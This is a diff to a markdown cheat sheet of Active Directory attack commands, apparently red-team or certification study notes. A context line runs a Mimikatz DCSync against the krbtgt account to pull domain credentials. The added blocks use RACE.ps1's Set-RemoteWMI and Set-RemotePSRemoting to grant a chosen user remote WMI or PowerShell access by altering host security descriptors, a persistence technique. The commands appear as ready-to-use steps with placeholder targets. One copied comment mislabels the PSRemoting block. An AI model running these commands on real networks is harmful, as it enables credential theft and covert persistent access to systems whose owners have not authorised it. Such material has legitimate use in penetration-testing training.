@@ -104,11 +104,20 @@ C:> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 ```
 
 - **WMI Security Descriptors**
+
 ```powershell
+# To be able to run WMI commands
 C:> . .\RACE.ps1
 
-C:> 
+# Allow <user> WMI access in host. Domain Admin privileges shell process required
+C:> Set-RemoteWMI -SamAccountName <username> -ComputerName <hostname_full_FQDN> -namespace 'root\cimv2' -Verbose
+```
+```powershell
+# To be able to run WMI commands
+C:> . .\RACE.ps1
 
+# Allow <user> WMI access in host. Domain Admin privileges shell process required
+C:> Set-RemotePSRemoting –SamAccountName <username> -ComputerName <hostname_full_FQDN> -Verbose
 ```
 ### MORE
 
